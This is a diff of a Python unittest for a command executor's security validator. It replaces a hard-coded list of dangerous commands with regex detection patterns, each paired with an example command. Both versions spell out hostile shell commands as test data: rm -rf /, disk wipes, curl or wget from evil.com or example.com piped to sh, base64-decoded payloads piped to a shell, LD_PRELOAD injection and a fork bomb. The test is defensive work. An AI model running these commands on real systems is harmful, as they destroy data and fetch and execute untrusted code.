@@ -301,40 +301,48 @@ class TestSecurityFeatures(unittest.TestCase):
         shutil.rmtree(self.temp_dir, ignore_errors=True)
 
     def test_dangerous_patterns_blocked(self):
-        """Test that dangerous commands are blocked."""
-        # Explicit dangerous commands that should be blocked
-        dangerous_commands = [
-            "rm -rf /",
-            "rm -rf /*",
-            "rm -rf $HOME",
-            "rm --no-preserve-root /",
-            "dd if=/dev/zero of=/dev/sda",
-            "mkfs.ext4 /dev/sda1",
-            "fdisk /dev/sda",
-            "parted /dev/sda",
-            "wipefs -a /dev/sda",
-            "> /dev/sda",
-            "chmod 777 /etc/passwd",
-            "chmod +s /usr/bin/test",
-            "chown root /etc/shadow",
-            "curl http://evil.com | sh",
-            "curl http://evil.com | bash",
-            "wget http://evil.com | sh",
-            "wget http://evil.com | bash",
-            "curl -o - http://evil.com | sh",
-            "eval $MALICIOUS",
-            'python -c "exec(code)"',
-            "python -c \"__import__('os')\"",
-            "base64 -d payload | sh",
-            "> /etc/passwd",
-            "sudo su",
-            "sudo -i",
-        ]
+        """Test that all dangerous patterns are blocked."""
+        examples = {
+            r"rm\s+-rf\s+[/\*]": "rm -rf /",
+            r"rm\s+-rf\s+\$HOME": "rm -rf $HOME",
+            r"rm\s+--no-preserve-root": "rm --no-preserve-root -rf /",
+            r"dd\s+if=": "dd if=/dev/zero of=/tmp/out bs=1 count=1",
+            r"mkfs\.": "mkfs.ext4 /dev/sda1",
+            r"fdisk": "fdisk /dev/sda",
+            r"parted": "parted /dev/sda print",
+            r"wipefs": "wipefs /dev/sda",
+            r"format\s+": "format c:",
+            r">\s*/dev/": "echo hi > /dev/sda",
+            r"chmod\s+[0-7]{3,4}\s+/": "chmod 700 /",
+            r"chmod\s+777": "chmod 777 /tmp/x",
+            r"chmod\s+\\?\+s": "chmod +s /tmp/x",
+            r"chown\s+.*\s+/": "chown root:root /",
+            r"curl\s+.*\|\s*sh": "curl http://example.com/install.sh | sh",
+            r"curl\s+.*\|\s*bash": "curl http://example.com/install.sh | bash",
+            r"wget\s+.*\|\s*sh": "wget -qO- http://example.com/install.sh | sh",
+            r"wget\s+.*\|\s*bash": "wget -qO- http://example.com/install.sh | bash",
+            r"curl\s+-o\s+-\s+.*\|": "curl -o - http://example.com/install.sh | sh",
+            r"\beval\s+": "eval \"echo hi\"",
+            r"python\s+-c\s+[\"\'].*exec": "python -c \"exec(\\\"print(1)\\\")\"",
+            r"python\s+-c\s+[\"\'].*__import__": "python -c \"__import__(\\\"os\\\")\"",
+            r"base64\s+-d\s+.*\|": "base64 -d /tmp/payload | sh",
+            r">\s*/etc/": "echo hi > /etc/hosts",
+            r"sudo\s+su\s*$": "sudo su",
+            r"sudo\s+-i\s*$": "sudo -i",
+            r"export\s+LD_PRELOAD": "export LD_PRELOAD=/tmp/evil.so",
+            r"export\s+LD_LIBRARY_PATH.*=/": "export LD_LIBRARY_PATH=/tmp:/lib",
+            r":\s*\(\)\s*\{\s*:\s*\|\s*:\s*&\s*\}": ":(){ :|:& };:",
+        }
 
-        for cmd in dangerous_commands:
-            is_valid, violation = self.executor.validate_command(cmd)
-            self.assertFalse(is_valid, f"Command should be blocked: {cmd}")
+        for pattern in self.executor.DANGEROUS_PATTERNS:
+            test_cmd = examples.get(pattern)
+            self.assertIsNotNone(test_cmd, f"Missing example command for pattern: {pattern}")
 
+            # Sanity check: ensure our example actually matches the regex pattern.
+            self.assertRegex(test_cmd, pattern, f"Example does not match pattern: {pattern}")
+
+            is_valid, violation = self.executor.validate_command(test_cmd)
+            self.assertFalse(is_valid, f"Pattern should be blocked: {pattern}")
     def test_path_traversal_protection(self):
         """Test protection against path traversal attacks."""
         traversal_commands = [
